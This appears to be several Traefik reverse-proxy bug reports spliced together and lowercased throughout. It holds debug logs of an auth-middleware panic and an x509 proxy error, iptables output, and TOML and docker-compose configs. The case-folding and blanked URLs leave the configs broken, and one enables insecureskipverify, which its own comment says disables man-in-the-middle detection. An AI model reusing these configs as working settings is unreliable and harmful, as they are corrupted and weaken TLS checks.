traefik.port:80 traefik.docker.network:traefik traefik.backend:foo traefik.enable:true traefik.frontend.rule:host:dont-do-this-at.work]]"
traefik | time="2018-11-19t22:42:15z" level=debug msg="filtering disabled container /traefik"
traefik | time="2018-11-19t22:42:15z" level=debug msg="originlabelsmap[com.docker.compose.project:npe traefik.frontend.auth.based.users:metrics:$apr1$aoc2p0ia$afplbivczpfalkwt816fk
traefik.port:80 traefik.backend:foo traefik.docker.network:traefik com.docker.compose.config-hash:1c459ff6e8cc9a224c32794db66ed8f2e4f58a0a8d6a3202b01a7beae28aa20c com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.service:whoami com.docker.compose.slug:41cd7db5169afaa027632e92e1fa2d88ed8bd49b217b9cd3fa48632ca45b8c com.docker.compose.version:1.23.1 traefik.enable:true traefik.frontend.rule:host:dont-do-this-at.work]"
traefik | time="2018-11-19t22:42:15z" level=debug msg="alllabelsmap[:map[traefik.frontend.rule:host:dont-do-this-at.work traefik.frontend.auth.based.users:metrics:$apr1$aoc2p0ia$afplbivczpfalkwt816fk
traefik.port:80 traefik.backend:foo traefik.docker.network:traefik traefik.enable:true]]"
traefik | time="2018-11-19t22:42:15z" level=debug msg="backend backend-foo: no load-balancer defined, fallback to \'wrr\' method"
traefik | time="2018-11-19t22:42:15z" level=debug msg="configuration received from provider docker: {\\"backends\\":{\\"backend-foo\\":{\\"servers\\":{\\"server-npe-whoami-1-41cd7db5169a-4dbdc7fb202a58a390c42b961e83dde8\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-host-dont-do-this-at-work-0\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-foo\\",\\"routes\\":{\\"route-frontend-host-dont-do-this-at-work-0\\":{\\"rule\\":\\"host:dont-do-this-at.work\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null,\\"auth\\":{}}}}"
traefik | time="2018-11-19t22:42:15z" level=debug msg="wiring frontend frontend-host-dont-do-this-at-work-0 to entrypoint http"
traefik | time="2018-11-19t22:42:15z" level=debug msg="creating backend backend-foo"
traefik | time="2018-11-19t22:42:15z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-dont-do-this-at-work-0"
traefik | time="2018-11-19t22:42:15z" level=debug msg="creating load-balancer wrr"
traefik | time="2018-11-19t22:42:15z" level=debug msg="creating server server-npe-whoami-1-41cd7db5169a-4dbdc7fb202a58a390c42b961e83dde8 at with weight 1"
traefik | time="2018-11-19t22:42:15z" level=debug msg="creating route route-frontend-host-dont-do-this-at-work-0 host:dont-do-this-at.work"
traefik | time="2018-11-19t22:42:15z" level=info msg="server configuration reloaded on :80"
traefik | time="2018-11-19t22:42:22z" level=error msg="recovered from panic in http handler [<snip> - /b]: runtime error: invalid memory address or nil pointer dereference"
traefik | time="2018-11-19t22:42:22z" level=error msg="stack: goroutine 36 [running]:\ github.com/containous/traefik/middlewares.recoverfunc( , , )\ \\t/go/src/github.com/containous/traefik/middlewares/recover.go:40 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:513 + \ github.com/containous/traefik/middlewares/auth.(*authenticator).servehttp( , , , , )\ \\t/go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:161 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 + \ github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 + \ github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )\ \\t/go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp-fm( , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + \ net/http.handlerfunc.servehttp( , , , )\ \\t/usr/local/go/src/net/http/server.go:1964 + \ github.com/containous/traefik/middlewares.(*requesthost).servehttp( , , , , )\ \\t/go/src/github.com/containous/traefik/middlewares/request_host.go:20 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp-fm( , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + \ net/http.handlerfunc.servehttp( , , , )\ \\t/usr/local/go/src/net/http/server.go:1964 + \ github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )\ \\t/go/src/github.com/containous/traefik/middlewares/recover.go:24 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + \ github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 + \ github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 + \ github.com/containous/traefik/h2c.server.serve.func1( , , )\ \\t/go/src/github.com/containous/traefik/h2c/h2c.go:78 + \ net/http.handlerfunc.servehttp( , , , )\ \\t/usr/local/go/src/net/http/server.go:1964 + \ net/http.serverhandler.servehttp( , , , )\ \\t/usr/local/go/src/net/http/server.go:2741 + \ net/http.(*conn).serve( , , )\ \\t/usr/local/go/src/net/http/server.go:1847 + \ created by net/http.(*server).serve\ \\t/usr/local/go/src/net/http/server.go:2851 + \ " ```
```toml defaultentrypoints = ["http","https"] loglevel = "debug" #config to redirect http to https [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] entrypoint = "https" [entrypoints.admin] address = ":8888" [entrypoints.https] address = ":443" [entrypoints.https.tls] [api] [api.statistics] recenterrors = 10 [kubernetes] [metrics] [metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] entrypoint = "traefik" [ping] entrypoint = "http" [accesslog] [acme] email = "some@admin.com" acmelogging = true overridecertificates = true onhostrule = true storage = "traefik-cert/acme/account" entrypoint = "https" [acme.httpchallenge] entrypoint = "http"
below is the output of iptables -l ```
chain input (policy accept)
target prot opt source destination accept all -- my.domain.com anywhere chain forward (policy drop)
target prot opt source destination docker-user all -- anywhere anywhere docker-ingress all -- anywhere anywhere docker-isolation-stage-1 all -- anywhere anywhere accept all -- anywhere anywhere ctstate related,established
docker all -- anywhere anywhere accept all -- anywhere anywhere accept all -- anywhere anywhere accept all -- anywhere anywhere ctstate related,established
docker all -- anywhere anywhere accept all -- anywhere anywhere accept all -- anywhere anywhere ctstate related,established
docker all -- anywhere anywhere accept all -- anywhere anywhere accept all -- anywhere anywhere accept all -- anywhere anywhere ctstate related,established
docker all -- anywhere anywhere accept all -- anywhere anywhere accept all -- anywhere anywhere drop all -- anywhere anywhere chain output (policy accept)
target prot opt source destination chain docker (4 references)
target prot opt source destination accept tcp -- anywhere 172.17.0.2 tcp dpt:5000 chain docker-ingress (1 references)
target prot opt source destination accept tcp -- anywhere anywhere tcp dpt:30224
accept tcp -- anywhere anywhere state related,established tcp spt:30224
accept tcp -- anywhere anywhere tcp dpt:30223
accept tcp -- anywhere anywhere state related,established tcp spt:30223
accept tcp -- anywhere anywhere tcp dpt:30245
accept tcp -- anywhere anywhere state related,established tcp spt:30245
accept tcp -- anywhere anywhere tcp dpt:30244
accept tcp -- anywhere anywhere state related,established tcp spt:30244
accept tcp -- anywhere anywhere tcp dpt:30243
accept tcp -- anywhere anywhere state related,established tcp spt:30243
accept tcp -- anywhere anywhere tcp dpt:30269
accept tcp -- anywhere anywhere state related,established tcp spt:30269
accept tcp -- anywhere anywhere tcp dpt:30268
accept tcp -- anywhere anywhere state related,established tcp spt:30268
accept tcp -- anywhere anywhere tcp dpt:30267
accept tcp -- anywhere anywhere state related,established tcp spt:30267
accept tcp -- anywhere anywhere tcp dpt:30275
accept tcp -- anywhere anywhere state related,established tcp spt:30275
accept tcp -- anywhere anywhere tcp dpt:30274
accept tcp -- anywhere anywhere state related,established tcp spt:30274
accept tcp -- anywhere anywhere tcp dpt:30273
accept tcp -- anywhere anywhere state related,established tcp spt:30273
accept tcp -- anywhere anywhere tcp dpt:30263
accept tcp -- anywhere anywhere state related,established tcp spt:30263
accept tcp -- anywhere anywhere tcp dpt:30262
accept tcp -- anywhere anywhere state related,established tcp spt:30262
accept tcp -- anywhere anywhere tcp dpt:30261
accept tcp -- anywhere anywhere state related,established tcp spt:30261
accept tcp -- anywhere anywhere tcp dpt:30254
accept tcp -- anywhere anywhere state related,established tcp spt:30254
accept tcp -- anywhere anywhere tcp dpt:30253
accept tcp -- anywhere anywhere state related,established tcp spt:30253
accept tcp -- anywhere anywhere tcp dpt:30252
accept tcp -- anywhere anywhere state related,established tcp spt:30252
accept tcp -- anywhere anywhere tcp dpt:30230
accept tcp -- anywhere anywhere state related,established tcp spt:30230
accept tcp -- anywhere anywhere tcp dpt:30229
accept tcp -- anywhere anywhere state related,established tcp spt:30229
accept tcp -- anywhere anywhere tcp dpt:30228
accept tcp -- anywhere anywhere state related,established tcp spt:30228
accept tcp -- anywhere anywhere tcp dpt:30222
accept tcp -- anywhere anywhere state related,established tcp spt:30222
accept tcp -- anywhere anywhere tcp dpt:http-alt
accept tcp -- anywhere anywhere state related,established tcp spt:http-alt
accept tcp -- anywhere anywhere tcp dpt:https
accept tcp -- anywhere anywhere state related,established tcp spt:https
accept tcp -- anywhere anywhere tcp dpt:http
accept tcp -- anywhere anywhere state related,established tcp spt:http
accept tcp -- anywhere anywhere tcp dpt:30000
accept tcp -- anywhere anywhere state related,established tcp spt:30000
return all -- anywhere anywhere chain docker-isolation-stage-1 (1 references)
target prot opt source destination docker-isolation-stage-2 all -- anywhere anywhere docker-isolation-stage-2 all -- anywhere anywhere docker-isolation-stage-2 all -- anywhere anywhere docker-isolation-stage-2 all -- anywhere anywhere return all -- anywhere anywhere chain docker-isolation-stage-2 (4 references)
target prot opt source destination drop all -- anywhere anywhere drop all -- anywhere anywhere drop all -- anywhere anywhere drop all -- anywhere anywhere return all -- anywhere anywhere chain docker-user (1 references)
target prot opt source destination return all -- anywhere anywhere ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) unfortunately, there is no relevant log output genrated.
i'm running on a local, baremetal docker host
all services are running on the same host machine
traefik.toml
loglevel = "debug"
[traefiklog]
filepath = "/logs/traefik.log" [accesslog]
filepath = "/logs/access.log" # if set to true invalid ssl certificates are accepted for backends.
# note: this disables detection of man-in-the-middle attacks so should only be used on secure backend networks.
# default: false
insecureskipverify = true # enable acme (let's encrypt): automatic ssl
[acme] email = "me@myemailprovider.com" storage = "/etc/traefik/acme.json" entrypoint = "https" acmelogging = true ondemand = false onhostrule = true
[acme.dnschallenge] provider = "route53" [[acme.domains]] main = "*.mydomain.com" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_128_cbc_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256" ] defaultentrypoints = ["http", "https"] [retry] attempts = 3
[healthcheck] [respondingtimeouts] readtimeout = "15s" writetimeout = "15s" idletimeout = "360s" [forwardingtimeouts] dialtimeout = "30s" responseheadertimeout = "0s" [api] dashboard = true debug = true ################################################################
# file configuration backend
################################################################ [file] directory = "/etc/traefik/routes/" watch = true ``` routes/unms.toml
[backends] [backends.unms] [backends.unms.servers.server1] url = " " [frontends] [frontends.unms] entrypoints = ["http", "https"] backend = "unms" passhostheader = true [frontends.unms.headers] framedeny = true stsseconds = 315360000 stsincludesubdomains = true stspreload = true contenttypenosniff = true browserxssfilter = true [frontends.unms.routes] [frontends.unms.routes.test_1] rule = "host:unms.mydomain.com"
``` routes/unifi.toml
[backends] [backends.unifi] [backends.unifi.servers.server1] url = " " [frontends] [frontends.unifi] entrypoints = ["http", "https"] backend = "unifi" passhostheader = true [frontends.unifi.headers] framedeny = true stsseconds = 315360000 stsincludesubdomains = true stspreload = true contenttypenosniff = true browserxssfilter = true [frontends.unifi.routes] [frontends.unifi.routes.test_1] rule = "host:unifi.mydomain.com"
``` routes/portainer.toml (working, non-https image)
[backends] [backends.portainer] [backends.portainer.servers.server1] url = " " [frontends] [frontends.portainer] entrypoints = ["http", "https"] backend = "portainer" passhostheader = true [frontends.portainer.headers] framedeny = true stsseconds = 315360000 stsincludesubdomains = true stspreload = true contenttypenosniff = true browserxssfilter = true [frontends.portainer.routes] [frontends.portainer.routes.test_1] rule = "host:portainer.mydomain.com"
``` traefik docker config
version: "3"
services: traefik: container_name: traefik deploy: restart_policy: condition: any env_file: - .env # aws_access_key_id # aws_secret_access_key # aws_region # aws_hosted_zone_id volumes: - '/docker/data/traefik/traefik.toml:/etc/traefik/traefik.toml' - '/docker/data/traefik/rules.toml:/etc/traefik/rules.toml' - '/docker/data/traefik/routes/:/etc/traefik/routes/' - '/docker/data/traefik/acme.json:/etc/traefik/acme.json' - '/docker/data/traefik/logs/:/logs/' - '/docker/data/traefik/config:/config/' ports: - '5080:8080' - '80:80' - '443:443' image: traefik restart: always
``` unms docker config
version: "3"
services: unms: container_name: unms deploy: restart_policy: condition: any image: oznu/unms:latest ports: - 6080:80 - 6443:443 - 2055:2055/udp environment: - tz=america/new_york volumes: - /docker/data/unms:/config
``` portainer docker config (working)
version: \'3\' services: portainer: command: -h unix:///var/run/docker.sock container_name: portainer deploy: restart_policy: condition: any image: portainer/portainer ports: - "9000:9000" volumes: - /var/run/docker.sock:/var/run/docker.sock - /docker/data/portainer/data:/data ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) 500 response
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 17.068165ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
``` full log output from a request
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 16.3323ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="new attempt 2 for request: /"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
